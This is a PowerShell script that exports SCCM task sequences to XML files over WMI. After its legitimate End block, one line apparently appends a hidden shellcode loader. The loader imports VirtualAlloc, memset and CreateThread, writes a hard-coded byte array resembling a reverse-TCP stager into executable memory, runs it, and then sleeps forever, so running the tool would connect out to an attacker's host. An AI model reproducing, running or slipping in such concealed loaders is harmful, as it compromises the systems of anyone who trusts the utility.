
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed.", ParameterSetName="SingleInstance")]
    [parameter(Mandatory=$true, ParameterSetName="AllInstances")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SiteServer,

    [parameter(Mandatory=$true, HelpMessage="Specify a PackageID for a Task Sequence that will be exported.", ParameterSetName="SingleInstance")]
    [ValidateNotNullOrEmpty()]
    [string]$PackageID,

    [parameter(Mandatory=$true, HelpMessage="Export all Task Sequences.", ParameterSetName="AllInstances")]
    [ValidateNotNull()]
    [switch]$All,

    [parameter(Mandatory=$true, HelpMessage="Specify an existing valid path to where the file will be stored.", ParameterSetName="SingleInstance")]
    [parameter(Mandatory=$true, ParameterSetName="AllInstances")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern("^[A-Za-z]{1}:\\\w+")]
    [ValidateScript({
	    
	    if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
		    Write-Warning -Message "$(Split-Path -Path $_ -Leaf) contains invalid characters"
	    }
	    else {
		    
		    if (Test-Path -Path $_ -PathType Container) {
				    return $true
		    }
		    else {
			    Write-Warning -Message "Unable to locate part of or the whole specified path, specify a valid path"
		    }
	    }
    })]
    [string]$Path,

    [parameter(Mandatory=$false, HelpMessage="Show a progressbar displaying the current operation.", ParameterSetName="AllInstances")]
    [switch]$ShowProgress
)
Begin {
    
    try {
        Write-Verbose -Message "Determining Site Code for Site server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Verbose -Message "Site Code: $($SiteCode)"
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to determine Site Code" ; break
    }
}
Process {
    
    function Export-TaskSequence {
        param(
            [parameter(Mandatory=$true)]
            [ValidateNotNullOrEmpty()]
            [System.Management.ManagementBaseObject]$TaskSequencePackage
        )
        Process {
            
            $XMLFileName = ($TaskSequencePackage | Select-Object -ExpandProperty Name) + ".xml"

            
            try {
                Write-Verbose -Message "Attempting to deserialize sequence for Task Sequence Package '$($TaskSequencePackage.Name)'"
                $TaskSequence = Invoke-WmiMethod -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_TaskSequencePackage -ComputerName $SiteServer -Name "GetSequence" -ArgumentList $TaskSequencePackage -ErrorAction Stop
            }
            catch [System.Exception] {
                Write-Warning -Message "Unable to deserialize sequence for Task Sequence Package: '$($TaskSequencePackage.Name)'" ; break
            }

            
            try {
                Write-Verbose -Message "Attempting to convert sequence for Task Sequence Package '$($TaskSequencePackage.Name)' to XML Document"
                $TaskSequenceResult = Invoke-WmiMethod -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_TaskSequence -ComputerName $SiteServer -Name "SaveToXml" -ArgumentList $TaskSequence.TaskSequence -ErrorAction Stop
                $TaskSequenceXML = [xml]$TaskSequenceResult.ReturnValue
            }
            catch [System.Exception] {
                Write-Warning -Message "Unable to convert sequence for Task Sequence Package '$($TaskSequencePackage.Name)' to XML Document" ; break
            }

            
            try {
                Write-Verbose -Message "Attempting to save '$($XMLFileName)' to '$($Script:Path)"
                $TaskSequenceXML.Save((Join-Path -Path $Script:Path -ChildPath $XMLFileName -ErrorAction Stop))
            }
            catch [System.Exception] {
                Write-Warning -Message "Unable to save XML Document to: '$($Script:Path)" ; break
            }
        }
    }

    
    if ($PSBoundParameters["ShowProgress"]) {
        $ProgressCount = 0
    }

    switch ($PSCmdlet.ParameterSetName) {
        "SingleInstance" {
            
            try {
                Write-Verbose -Message "Querying the SMS Provider for Task Sequence Package with PackageID of '$($PackageID)'"
                $TaskSequencePackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_TaskSequencePackage -ComputerName $SiteServer -Filter "PackageID like '$($PackageID)'" -ErrorAction Stop
            }
            catch [System.Exception] {
                Write-Warning -Message $_.Exception.Message ; break
            }

            
            if ($TaskSequencePackage -ne $null) {
                $TaskSequencePackage.Get()
                Export-TaskSequence -TaskSequencePackage $TaskSequencePackage
            }
            else {
                Write-Warning -Message "Query for Task Sequence Package with PackageID '$($PackageID)' did not return any objects"
            }
        }
        "AllInstances" {
            
            try {
                Write-Verbose -Message "Querying the SMS Provider for all Task Sequence Packages"
                $TaskSequencePackages = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_TaskSequencePackage -ComputerName $SiteServer -ErrorAction Stop
            }
            catch [System.Exception] {
                Write-Warning -Message $_.Exception.Message ; break
            }

            
            if ($TaskSequencePackages -ne $null) {
                
                $TaskSequencePackagesCount = ($TaskSequencePackages | Measure-Object).Count

                
                foreach ($TaskSequencePackage in $TaskSequencePackages) {
                    
                    if ($PSBoundParameters["ShowProgress"]) {
                        $ProgressCount++
                        Write-Progress -Activity "Exporting Task Sequences" -Id 1 -Status "$($ProgressCount) / $($TaskSequencePackagesCount)" -CurrentOperation "Current Task Sequence: $($TaskSequencePackage.Name)" -PercentComplete (($ProgressCount / $TaskSequencePackagesCount) * 100)
                    }

                    
                    $TaskSequencePackage.Get()
                    Export-TaskSequence -TaskSequencePackage $TaskSequencePackage
                }
            }
            else {
                Write-Warning -Message "Query for all Task Sequence Packages did not return any objects"
            }
        }
    }
}
End {
    if ($PSBoundParameters["ShowProgress"]) {
        Write-Progress -Activity "Exporting Task Sequences" -Id 1 -Completed
    }
}
$U5v = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $U5v -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc5,0x1c,0x55,0x0e,0x68,0x02,0x00,0x01,0xb1,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Syi=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Syi.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Syi,0,0,0);for (;;){Start-sleep 60};

